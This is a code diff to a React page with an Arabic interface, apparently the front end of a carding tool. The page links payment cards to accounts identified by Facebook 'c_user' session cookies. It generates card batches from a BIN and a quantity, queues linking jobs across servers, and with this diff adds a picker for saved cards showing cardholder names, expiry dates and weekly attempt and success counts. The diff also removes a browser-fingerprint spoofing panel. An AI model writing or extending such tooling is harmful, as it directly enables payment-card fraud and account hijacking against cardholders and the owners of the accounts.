@@ -70,6 +70,7 @@ const FB_CURRENCIES: Record<string, string[]> = {
 type CookieRow = { _id: string; c_user: string | null; createdAt?: string };
 
 type ServerItem = { _id: string; name: string; isActive?: boolean };
+type CardWithStats = { _id: string; details?: any; stats?: { attempts: number; successes: number }; createdAt?: string };
 
 type GenerateTempResponse = { batchId: string; count: number; preview: Array<{ last4: string; exp_month: string; exp_year: string; cardholder_name: string }>} ;
 
@@ -92,6 +93,8 @@ export default function LinkingPage() {
   const [selectedCookieIds, setSelectedCookieIds] = useState<string[]>([]);
   const [servers, setServers] = useState<ServerItem[]>([]);
   const [selectedServerIds, setSelectedServerIds] = useState<string[]>([]);
+  const [cards, setCards] = useState<CardWithStats[]>([]);
+  const [selectedCardIds, setSelectedCardIds] = useState<string[]>([]);
 
   const [bin, setBin] = useState('');
   const [quantity, setQuantity] = useState<number>(0);
@@ -178,10 +181,22 @@ export default function LinkingPage() {
     // Load available servers
     (async () => {
       try {
-        const res = await apiClient.get<{ success: boolean; data: ServerItem[] }>(`/api/servers`);
-        setServers(res?.data || []);
+        const res = await apiClient.get<{ success?: boolean; data?: ServerItem[] }>(`/api/servers`);
+        setServers((res as any)?.data || []);
       } catch (e) {
         console.error('Failed to load servers', e);
+      }
+    })();
+  }, []);
+
+  useEffect(() => {
+    // Load cards with stats
+    (async () => {
+      try {
+        const res = await apiClient.get<{ items: CardWithStats[] }>(`/api/cards/with-stats?limit=200`);
+        setCards(res.items || []);
+      } catch (e) {
+        console.error('Failed to load cards', e);
       }
     })();
   }, []);
@@ -207,6 +222,10 @@ export default function LinkingPage() {
 
   const toggleServer = (id: string) => {
     setSelectedServerIds(prev => prev.includes(id) ? prev.filter(x => x !== id) : [...prev, id]);
+  };
+
+  const toggleCard = (id: string) => {
+    setSelectedCardIds(prev => prev.includes(id) ? prev.filter(x => x !== id) : [...prev, id]);
   };
 
   const generateCards = async () => {
@@ -288,6 +307,23 @@ export default function LinkingPage() {
   }, [token]);
 
   const startLinking = async () => {
+    if (selectedCardIds.length > 0) {
+      // Link using selected saved cards via enqueue (cookieIds + cardIds)
+      if (selectedCookieIds.length === 0) { addToast('info', 'حدد الكوكيز'); return; }
+      setBusy(true);
+      try {
+        const payload: any = { cookieIds: selectedCookieIds, cardIds: selectedCardIds };
+        const res = await apiClient.post<{ enqueued: number }>(`/api/jobs/enqueue`, payload);
+        addToast('success', `تم بدء الربط لعدد ${(res as any).enqueued || selectedCookieIds.length}`);
+      } catch (e) {
+        console.error(e);
+        addToast('error', 'فشل بدء عملية الربط بالبطاقات المحفوظة');
+      } finally {
+        setBusy(false);
+      }
+      return;
+    }
+    // fallback to temp batch flow
     if (!batchId) {
       addToast('info', 'يرجى توليد البطاقات أولاً');
       return;
@@ -421,57 +457,21 @@ export default function LinkingPage() {
         </div>
 
         <div className="p-4 rounded-lg border border-slate-200 bg-white">
-          <h2 className="font-semibold mb-3 text-slate-800">البصمة (الدولة/اللغة/المنطقة الزمنية)</h2>
-          <div className="space-y-3">
-            <div className="grid grid-cols-2 gap-3">
-              <div>
-                <label className="block text-sm text-slate-700">الدولة (ISO-2)</label>
-                <select className="w-full border rounded px-3 py-2" value={country} onChange={(e) => setCountry(e.target.value)}>
-                  {Object.keys(COUNTRY_PRESETS).map(c => (
-                    <option key={c} value={c}>{c}</option>
-                  ))}
-                </select>
-              </div>
-              <label className="flex items-center gap-2 text-sm text-slate-700 mt-6">
-                <input type="checkbox" checked={useAutoFingerprint} onChange={e => setUseAutoFingerprint(e.target.checked)} />
-                استخدام القيم التلقائية حسب الدولة
+          <h2 className="font-semibold mb-3 text-slate-800">البطاقات المحفوظة</h2>
+          <div className="max-h-56 overflow-auto space-y-1 text-sm">
+            {cards.map(c => (
+              <label key={c._id} className="flex items-start gap-2 text-slate-700">
+                <input type="checkbox" checked={selectedCardIds.includes(String(c._id))} onChange={() => toggleCard(String(c._id))} />
+                <div className="flex-1">
+                  <div className="font-mono text-xs text-slate-900">{c.details?.number ? `**** **** **** ${String(c.details.number).slice(-4)}` : c._id}</div>
+                  <div className="text-xs text-slate-600">{c.details?.cardholder_name || c.details?.cardholderName || '-'} | {c.details?.exp_month}/{c.details?.exp_year} | {c.details?.country || '-'}</div>
+                  <div className="text-xs text-slate-600">هذا الأسبوع: محاولات {c.stats?.attempts || 0}، نجاح {c.stats?.successes || 0}</div>
+                </div>
               </label>
-            </div>
-            <div className="grid grid-cols-2 gap-3">
-              <div>
-                <label className="block text-sm text-slate-700">Accept-Language</label>
-                <select className="w-full border rounded px-3 py-2" value={acceptLanguage} onChange={(e) => setAcceptLanguage(e.target.value)} disabled={useAutoFingerprint}>
-                  {languageOptions.map(opt => (
-                    <option key={opt} value={opt}>{opt}</option>
-                  ))}
-                </select>
-              </div>
-              <div>
-                <label className="block text-sm text-slate-700">Timezone (IANA)</label>
-                <select className="w-full border rounded px-3 py-2" value={timezone} onChange={(e) => setTimezone(e.target.value)} disabled={useAutoFingerprint}>
-                  {timezoneOptions.map(opt => (
-                    <option key={opt} value={opt}>{opt}</option>
-                  ))}
-                </select>
-              </div>
-              <div>
-                <label className="block text-sm text-slate-700">Currency (اختياري)</label>
-                <select className="w-full border rounded px-3 py-2" value={currency} onChange={(e) => setCurrency(e.target.value)} disabled={useAutoFingerprint}>
-                  <option value="">(None)</option>
-                  {currencyOptions.map(opt => (
-                    <option key={opt} value={opt}>{opt}</option>
-                  ))}
-                </select>
-              </div>
-            </div>
-            <div className="rounded border border-slate-200 p-3 bg-slate-50 text-xs text-slate-700">
-              <div className="font-medium mb-1">معاينة البصمة</div>
-              <div>Country: {country}</div>
-              <div>Timezone: {timezone || '(auto)'}</div>
-              <div>Accept-Language: {acceptLanguage || '(auto)'}</div>
-              <div>Currency: {currency || '(none)'}</div>
-            </div>
+            ))}
+            {cards.length === 0 && <div className="text-sm text-slate-500">لا توجد بطاقات محفوظة</div>}
           </div>
+          <div className="text-xs text-slate-600 mt-2">إذا اخترت بطاقات هنا سيتم الربط منها مباشرة، وإلا فاستخدم التوليد المؤقت.</div>
         </div>
 
         <div className="p-4 rounded-lg border border-slate-200 bg-white">
